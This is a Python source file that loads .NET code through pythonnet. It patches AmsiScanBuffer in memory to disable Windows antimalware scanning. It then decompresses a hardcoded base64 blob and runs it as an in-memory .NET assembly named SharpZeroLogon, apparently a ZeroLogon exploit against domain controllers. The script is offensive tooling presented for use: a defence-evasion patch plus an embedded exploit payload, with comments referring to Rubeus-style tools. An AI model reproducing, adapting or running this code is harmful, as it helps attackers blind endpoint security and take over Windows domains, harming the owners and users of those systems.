import base64
import zlib
import argparse
import clr
import ctypes
from ctypes import *
import System
from System import Array, IntPtr, UInt32
from System.Reflection import Assembly
import System.Reflection as Reflection

# Ensure necessary .NET references are added
clr.AddReference("System.Management.Automation")

from System.Management.Automation import Runspaces, RunspaceInvoke
from System.Runtime.InteropServices import Marshal

base64_str = "eJztWXlsHNd5/2Z2d7i7FCkuKZG0IskjSo6pgyteEklF14pLSox4hYcORy093H0kx5qdWc3M0qLdBAqMxI0bu1GMprWNoEeQ1mqMpmgDxz2cxkkbwy0M2HELNK1RuO4B10iaFnDhogGs/t43swcpNXb+bNFHzffed7zvfd/3vnetJu75PEWIKIrv5k2i5ygoJ+n9yzV8jXf+YSN9PfHyrueU8Zd3za2Ynl50nWXXKOg5w7YdX18UuluyddPWs1OzesHJi3RDQ3JPqGN6hGhcidDDD979UlnvG9RB9Uo3UTuQeEBLDwDoZcNOBm01sFsWrdYoNWhG6N5PEzXxv2pdqbi8fphoKlT5euw2Tt5LtEmyITf4AWJSKXrFdC5x4Gdq8LQvrvqos22hX+1Vu2tU3Jt2PTdHoW2wkR3dtl4O5JNpV1hOLrBV2sy69FvkTm00s2kgqM9wlxjpu9GtRcZOlbq0jfLvV3aqnQhvcl+5bumO0BHQFaJUa1J9zIw8Zl6sj7Re37R/j6pdj/dta2tIgNanavtULXHheiRxvU9LtF1o2P+W1nYhqdX1/PXWfUQt3TF6N3ArdWfy0S3QeNcrUBrtTGGYZGczoAO7k/XN6ntbYbbqglvsBNAa6hLNalw293ciX7QutXVfs/pzMns6t6JLSzQVjT+IVRC1L7TEBj/LkYMgj9KitbbU1aWiKY1pzXWdkVBFStM6k2i3xFPxrT1nIRK/70LbfRdaEqmE1wq93GFbc7JTLfcI6O2dmPRkrVAqWSPVti8VZSpUwbJU7IR98+bN1n2IQR0tKHJuKIVIth2sdz8kfWyXgW5NttarrU9uirc9ul0Gp/XO9JecO8BpfbJBbalrbYnv70nVpeJPSvPcp2U/pFGyqwnYsxVM26+1JferbfWpeNsF6Viq7jGz98W6A9s766V59e6fVkZ03y43m6PvbUUk1OZYUOs3bx7cdV+L5h5RQonWluTgdcQ1nmiONsc6MT/agXr3M0pF124VTXiTjCfcu2UbTiS3s3Sz1lknx55096vlAevf25qQA256bytWmaod6N7Qr765oXlTZzyw+StqZZyTkXIzlYSHyVRSfwXaT+QQYvcLFWY5fenU7EdPKTJ7KVhbq/3p7nRfd1/PkKTEyAJ8Gmtz9yeJtsCtd/DtnvVd0172pES8gegHmLDd87P0TrgF7T49P5ZFHUXqbses7z5lOYvh+gGqnP9SpD+BONJ/KX3UymuHduDDDBC6UIPUgQ+uEmynzUSVPbxc1wVrjj+5FWhhm+iVSFBr9JHIWzGNnmboqM/GNlNcTgz9sjoBys6IhDe5/Yvc/jhDn+HvMP0h9SVAg+GbTHlJ/Y8IZLQGtPepEm6JSTiqylH+IiLb+zXZfoFlXlYaYkma0J5Fe0dU6vkay7+hSPgwtzdHG3hn/n22O5iNJrqb9sYyFWxniGmMxWIBlmSn/xg0iTVSgwJJUEYQk0ZS0foheGOYx0ZqBu9vSfIaQmwvS24GlgSWZCwFrEUJYjlCzcD6lCH6A8T9r6LPA35S+RbgM9rzpGknle/QuWuno98F/CrDLzD0GV5k+E2GLwBq9FjszwFbo98CPBp9GfATMdk+o7zKnl+jx/UXtb8M51Fij2jfDw8Nib2mvRlu2BIbjP0QGTOtS/wz7TdkHEPeF/VHlHdrsAcoorRUsMdpi7KNLtT020X3MnadFmIfVnbR0yG2M5ZWdtMzuwLsjlgvsLbd1X57eLb+jaOVk1sy/UNEZugTmoocfVCT9CNMn9ck/XMxmbtSJkYXlSr3LUUF12PuBNO3qJL+Y94Lf0+eAvQbNfS4Kun9fDuQMjE6LLd9uisq10Wb9pMkn4qpkPylmJQssM5/j0jJyzHZ/rCWoBsxBVkg/bsDMEl7AZuoh+EQwwzDMYYfY3iRoQG4lUxuX2G4xvAJ1vYphjfoG1ovvUDD2hHAbysn6CV6OzJMr9JXcU95FTKzoHw3coG+T7paon+h39QeAPwn7VOgnGRKQXsYd492+iLgdnoKUKdfA9xDXwHspN8GPEBfA+ymr1MaWTKopKmFMoAfonsBd5MJuJ8+AdjH8CMMh5l+lh4CnGXKxxnm6CnAy/RngB59T/kyPYhxEVU1uAXJnTMRrEfexXgPA6+R25tZpgnXml30s7DpX6M/jv59NItb4YuaQieVGD2iyX2xjl5DfVJJ0GAsQtFIAz2iRFFvpgdI1il6HHX/gJyp6LXyflcue2PV26Isj9I0C6ynBTuNBuPqkBlxfAl8SXz1yI699FHJXliY9Q3fzGVc11gbs01/bq0oZs0HxLGebpoUvlE0+3rprHBtYaFxudwYHezpGe4+NNSb7e7v6T/cPdI92tc/2Hd44FDvQAbo6Ojh7qGhnlOjA0Mjvf3DQ9lsZqSvJ5M9NXBocLCnv5fGFqB9Vrirws2U/BVhwwjDF+sY04bn3e+4+Vnh99KcM2b7h/vp6ISTL1niOB2dds1VdBkrFC1RgAL44dhZ2Gxa3nGaHF+Ym5mfnVuYzszOnp+aydLkyNz41OmpyYXZkeH5mZGF4TOZyckRiF3E1b3CHJ4ZyY5Mzo1lxmliKjs/PjI2OTpVZWfm585I9nBmbmqGVg2rJBYWKG/4BuUWqeDlHNcyF8kqTpYKi8KdWjq15gtvRhh5GraE4U6K+8tukYzz1NJYwVgWtW7PiCvDK4ZlCRv0gFTFhy0TrlbxZeEvnDHsvCVopoQgFsSoKax8SBp2bM9BvRIEDWaNmpaYNAqSVSiWfOEyksnlHPTmNsJaMNw1bp93TV+Mm7agc9JTmRxlWW4zn1VBrXta2MLFjOQzPq4Ni9BOp0tmDZYVi6XlZWPRElUaOp8zPXMdLeN5orBorc2Z/m3JrpEXsPFylTVnuIjEKB5rAqG9fGsf6fc54XpIkVuZCNOSuVxyOYNuZWeFl3PN4npm4DT3mBGWcZVb3q2dp12EPuffbtDimmsur9yWVSga9lqVEU4t031z0bRMv4bLsyDzjGZXDLd4j3CdcWfZsdPiqqD8/TLNwlyjxdISza55viikQ53pMCq45lFw26NxZJa/QhOG6yHPyinoirxcpSCEOVglTJYsa1bkSq5AYtrYIWjOLWGQfNYpGKZ9e5bt3Y57HrPnBUt5PWPCW80U15PmDS+wbT3ZKp4yPDibtSyywy0snQdS3r0YKXpgcGs6eOWHcaERu1SA76ZN04afW+FIbggsnRZ+sKLG7CXHLbC5lbiKJUvkmDJq2nkowSqzqRjWVrHg5E10ozlEH64WigTLXWl2aWlJuDQj/JJr1+yKjkvpnITYAad9tzxQ1jSWbceDiLdxTiEIW4syOmZO3MIuL9gKP1iYmHt4BXRSLDuYWF+MWgYu/1hbXjkFzwiriIShFUQNPT0ZiuGS68LUMiWIfyafdwOs3MIqgzM0tXgfwgP6kjVl5dHJl+g50/VLhlVGlyy5UYbIbBH5jnnx3bVpx7R9kgcV8g4pzecWjTtGftxcdLFtkdxqQ0smRMEBxSkujFyBbqwZPhrvsMihZXw2TnsLt5g05VHj/XPtF3Sax7FvgC3w2NdxNVgB5lKR7gHFRafxSuc0KFfx6XSUfJaSvXzgeSjWaQlXozzkjrOEAx0+BpM9DQwmtXehj8B4Qa8uSBho5TDmcVIaarkSq3KVu6YrbRP6lnk0A20L0nlgR3A5oqmqlA49JbRyrNGDdAmyadDPcy8LrRKPpXNYcJqhXgCvCCh1FInOTnMMluCDS4XKyAZ6+hhDAJce5njUwFOd2z54Bfbfw5jyj649Nc+BWGSTdbAcwBygFLTYacFmyyFXGersisHmCh5csAvT6CWdMivapGmrLGlyOORIBeY4rMdm/fczdpnlPQ6QDM4JXKSP4cOdfy2JBKgN2y7IZnF31NlJ6d4iaw3CaeEWXPXB5dpkD/Isucbh0CupVM3Dcphk2C9zeJ7IMkPwkBPMCOZasHCOhylxxHXODGle4FA+DJtfCeskzSFvJzjn+nDBz9Nh9F+CTDfaPcAMtIeYt0gDqHN0CHgebSmTwzcIXNb0sdF1mRaMUJvHhZ/SWjqfxEOj6v76XJYTPLdudcmQ6mGAF8MUWgv1Btke9EP58t/9epf92o2zv/pE5h9/5W8gF9UVJR7RSYmhkUpJtFECVauLxuOxeFNd/Y5Ye6q9PZncEYvHk4k6vK2bL6Z+Rv5gZqBju9YEDTspmlRS7cCTsncyBqn2WGtdo6o2NqY6U531OxrjjfHUnpSe2hMlDKLpyo7GHREIQgKwsbEx/o0HLp27o/+Nz/K9PaqErwxc/yWQxKi8wkflQziipQ6oWruqJVQtDmQ7DEbVqWoQVNob4+jankg0JZIUU9the6IpnpC09qZUe6KeovHGxqZUp/xHdWintpfR+lSVsIf/6fA5viO2IyafizEYD1+U8CfgnfJXijm19bxrFCcde+RqTvC9aG7Fde73FMgFj/gWhRo3nJkU40dKm0LNlauP/u0but7b3Yu02qvQnp5DOTFk9OW68KIY6urvGezvGhxY7O0SvUNLuUOid3FgAJKbFKrrSXfLP6IxhbalcTuvXP0OhPeZY6v96QHY2rilwsqaXtEy+GbbLPvoFY7ez7/K05V3xz4na+kEEpOuHsbXvu7xte43d1lmZrOz37vyz0Pf2bt69rfevPTNd7Y92yQ9zR65ZFzqueRdmnMcy7u0PhobUWfxvku4RgocnBtY6WJ+kaID1fF2lv//4DalaaAWWxh23JGrgu8y/DIRgi88sty8i/ST9Jw09KH/VEofub2+/71F5XnSsZPK6ZsO/jelpgS/tg3ehi7LBmJFfuV/kH8dS+XzJ4nGI1XOeKQf8BxOkAXAEZpBa4zwlAQ+Bjga/G8NPR/90XvVXzirOk+EWJQ2vv+RW0w7x9viaLhVjmF7lUezLHu41xy48pTCJazmSA7K70afkT9EwCYfUsFRfqumn2eZ7spfPzZbLDraxvEY5hOuEB78Xqi5o4ZX5PHX4G1w/pbLKG2GTHm8LB8eObajuM7On3T9kqUb21JVzzmW8Wr69+AY6K58ctwWyI+xvVI2uIpVrfsg1z1ZzlAz9IwDW2YNw3y9W2MPlqFD/n/YrTSdbuDTqRe29LI9+zhWVT3BjOX5umTw3cSrxGySbZ8K9Zmh7WXf7Z/ah+M8B9Mskedbjr9unt4v9v0c+/X9N87AxvgPcp8MH//Sx/LR/X79fjBM9HbNIvjRH/3J0RNXC5a+Gm72HTgQOnRh5+TbavlYx/zcaNdgh47nlZ03LMcWxzrWhNdx4nhDsiF51Ajf2TpU2N6xDjy3jni5FVEwvK6CmXMdz1nyu3JO4YjhFdKrPR16wbDNJbzWztWOB2W6XlE2xq9hf22dTfKvQ7dxzBzrmFjLFPGSyfFrMW0Uix0HAw2+fBHLl+QHtKc3GBk9PfnwxZghDoorrpSEfF/LX8fwxlsW3gfU2tdR0VKrBwdIriQtHherwtItCY91GN6YvergQd2hl8xMTr62jnUsGZYnQqdYycHbWFM2/eA6248erAQB+NGD5aAepw9euoNfZ7sH3lfy/8v/wfLfe+M2Vg=="


def bypass():
    """
    Bypasses the Antimalware Scan Interface (AMSI) by patching the AmsiScanBuffer method in amsi.dll.
    This allows scripts to run without being scanned and potentially blocked by AMSI.
    """
    windll.LoadLibrary("amsi.dll")
    windll.kernel32.GetModuleHandleW.argtypes = [c_wchar_p]
    windll.kernel32.GetModuleHandleW.restype = c_void_p
    handle = windll.kernel32.GetModuleHandleW('amsi.dll')
    windll.kernel32.GetProcAddress.argtypes = [c_void_p, c_char_p]
    windll.kernel32.GetProcAddress.restype = c_void_p
    BufferAddress = windll.kernel32.GetProcAddress(handle, "AmsiScanBuffer")
    BufferAddress = IntPtr(BufferAddress)
    Size = System.UInt32(0x05)
    ProtectFlag = System.UInt32(0x40)
    OldProtectFlag = Marshal.AllocHGlobal(0)
    virt_prot = windll.kernel32.VirtualProtect(BufferAddress, Size, ProtectFlag, OldProtectFlag)
    patch = System.Array[System.Byte]((System.UInt32(0xB8), System.UInt32(0x57), System.UInt32(0x00), System.UInt32(0x07), System.UInt32(0x80), System.UInt32(0xC3)))
    Marshal.Copy(patch, 0, BufferAddress, 6)

def base64_to_bytes(base64_string):
    """
    Converts a base64 encoded string to a .NET byte array after decompressing it.
    Args:
        base64_string: The base64 encoded and compressed string to convert.
    Returns:
        A .NET byte array of the decompressed data.
    """
    # Decode the base64 string to get the compressed binary data
    compressed_data = base64.b64decode(base64_string)
    # Decompress the data
    decompressed_data = zlib.decompress(compressed_data)
    # Convert the decompressed binary data to a .NET byte array
    return System.Array[System.Byte](decompressed_data)

def load_and_execute_assembly(command):
    """
    Loads a .NET assembly from a base64 encoded and compressed string, and executes a specified method.
    Args:
        command: The command to execute within the loaded assembly.
    Returns:
        The result of the executed command.
    """
    
    assembly_bytes = base64_to_bytes(base64_str)
    
    # Load the assembly
    assembly = Assembly.Load(assembly_bytes)
    
    # Get the type of the Rubeus.Program class
    program_type = assembly.GetType("SharpZeroLogon.Program")
    # You don't need to create an instance of the class for a static method
    method = program_type.GetMethod("MainString")
    #Have to do this nesting thing to deal with different main entry points and public/private methods  
    if method == None:
        method =program_type.GetMethod("Main")
        if method == None:
            method = program_type.GetMethod("Main",Reflection.BindingFlags.NonPublic | Reflection.BindingFlags.Static)
        # Create a jagged array to pass in an array of string arrays to satisfy arguments requirements
        command_array = Array[str]([command])
        command_args = System.Array[System.Object]([command_array])
    else:
        #Ghost Pack stuff like rubeus use a different input
        command_args = Array[str]([command]) 

    # Invoke the MainString method
    result = method.Invoke(None, command_args)

    return result
    
def main():
    bypass()
    parser = argparse.ArgumentParser(description='Execute a command on a hardcoded base64 encoded assembly')
    parser.add_argument('command', type=str, nargs='?', default="", 
                        help='Command to execute (like "help" or "triage"). If not specified, a default command is executed.')

    args = parser.parse_args()
    
    result = load_and_execute_assembly(args.command)
    print(result)

if __name__ == "__main__":
    main()